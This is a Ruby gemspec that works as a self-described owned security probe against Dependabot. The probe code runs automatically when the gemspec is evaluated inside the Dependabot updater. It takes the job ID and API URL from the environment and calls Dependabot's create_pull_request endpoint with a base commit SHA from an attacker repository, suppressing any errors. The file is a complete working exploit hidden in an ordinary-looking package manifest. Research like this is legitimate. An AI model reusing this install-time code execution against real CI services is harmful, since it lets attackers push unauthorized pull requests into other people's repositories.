# frozen_string_literal: true

require "json"
require "net/http"
require "uri"

# Owned security test. A git dependency's gemspec is evaluated inside the
# Dependabot updater. The probe asks Dependabot's own API to create one benign
# PR in the research-owned consumer repository. It neither reads nor exports
# credentials.
module OwnedDependabotRemoteProbe
  CONSUMER = "7s5/codeload-owned-probe-20261030-91f64a2c"
  # Cross-repository base-SHA control. This commit exists in the attacker
  # repository, not in the consumer repository. A secure implementation must
  # reject it before constructing a Dependabot branch in the consumer.
  ATTACKER_BASE_SHA = "b86ade7b9af1da5dfad3bec2ee9f1a295c0171f8"
  RAW_PATH = "vendor/owned-dependabot-cross-repo-base-control.txt"

  CONTROL_CONTENT = "owned-dependabot-cross-repository-base-sha-control\n"

  module_function

  def run
    job_id = ENV["DEPENDABOT_JOB_ID"]
    api_base = ENV["DEPENDABOT_API_URL"]
    return if job_id.to_s.empty? || api_base.to_s.empty?

    # Avoid duplicate submissions if Bundler evaluates this gemspec in more
    # than one process during the same update job.
    marker = "/tmp/owned-dependabot-path-traversal-#{job_id}"
    File.open(marker, File::WRONLY | File::CREAT | File::EXCL, 0o600) {}

    base_sha = ATTACKER_BASE_SHA

    endpoint = URI("#{api_base.sub(%r{/*$}, "")}/update_jobs/#{job_id}/create_pull_request")
    request = Net::HTTP::Post.new(endpoint.request_uri)
    request["Content-Type"] = "application/json"
    request.body = JSON.generate(payload(base_sha))

    client = Net::HTTP::Proxy(:ENV).new(endpoint.host, endpoint.port)
    client.use_ssl = endpoint.scheme == "https"
    client.open_timeout = 10
    client.read_timeout = 20
    client.request(request)
  rescue Errno::EEXIST
    nil
  rescue StandardError
    nil
  end

  def current_base_sha
    endpoint = URI("https://api.github.com/repos/#{CONSUMER}/commits/main")
    request = Net::HTTP::Get.new(endpoint.request_uri)
    request["Accept"] = "application/vnd.github+json"
    request["User-Agent"] = "owned-dependabot-path-traversal-probe"

    client = Net::HTTP::Proxy(:ENV).new(endpoint.host, endpoint.port)
    client.use_ssl = true
    client.open_timeout = 10
    client.read_timeout = 20
    response = client.request(request)
    JSON.parse(response.body)["sha"]
  end

  def payload(base_sha)
    requirement = {
      "file" => "Gemfile",
      "requirement" => ">= 0",
      "groups" => [],
      "source" => {
        "type" => "git",
        "url" => "https://github.com/downgraded/codeload-owned-probe-20261030-91f64a2c",
        "branch" => "main",
        "ref" => nil
      }
    }

    {
      "data" => {
        "dependencies" => [{
          "name" => "owned_dependabot_cross_repo_base_probe",
          "version" => "0.0.4",
          "previous-version" => "0.0.3",
          "requirements" => [requirement],
          "previous-requirements" => [requirement],
          "directory" => "/"
        }],
        "updated-dependency-files" => [{
          "name" => RAW_PATH,
          "content" => CONTROL_CONTENT,
          "directory" => "/",
          "type" => "file",
          "support_file" => false,
          "content_encoding" => "utf-8",
          "deleted" => false,
          "operation" => "create"
        }],
        "base-commit-sha" => base_sha,
        "commit-message" => "chore: owned Dependabot cross-repository base SHA control",
        "pr-title" => "Owned Dependabot cross-repository base SHA control",
        "pr-body" => "Owned security test: the supplied base SHA belongs to the attacker repository, not this consumer repository."
      }
    }
  end
end

OwnedDependabotRemoteProbe.run

Gem::Specification.new do |spec|
  spec.name = "owned_dependabot_remote_probe"
  spec.version = "0.0.4"
  spec.summary = "Owned Dependabot security probe"
  spec.authors = ["Owned Security Test"]
  spec.files = []
end
